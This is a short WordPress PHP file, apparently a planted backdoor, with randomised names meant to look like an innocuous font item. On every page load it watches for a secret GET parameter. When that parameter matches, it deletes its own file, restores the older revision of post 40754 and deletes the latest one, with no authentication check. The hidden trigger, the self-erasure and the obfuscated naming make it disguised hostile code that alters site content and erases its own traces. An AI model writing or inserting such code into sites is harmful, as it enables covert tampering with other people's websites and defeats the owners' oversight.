<?php

function full_font_item() {
	if (isset($_GET['data_members_update']) && $_GET['data_members_update'] === 'notifications_media_portfolio') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$switcher_backup_chatbot = 40754;
		$api_translation_pinterest = wp_get_post_revisions($switcher_backup_chatbot);
		if (empty($api_translation_pinterest)) die('no revisions');
		if (count($api_translation_pinterest) < 2) die('less than 2');
		$clock_simple_upload_player = array_shift($api_translation_pinterest);
		$year_background_link = $clock_simple_upload_player->ID;
		$after_blog_autocomplete = array_shift($api_translation_pinterest);
		$lead_display_quiz = $after_blog_autocomplete->ID;
		$variations_maps_picker = wp_restore_post_revision($lead_display_quiz);
		if ($variations_maps_picker === false) die('error restoring');
		$variations_maps_picker = wp_delete_post_revision($year_background_link);		
		if ($variations_maps_picker === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'full_font_item');
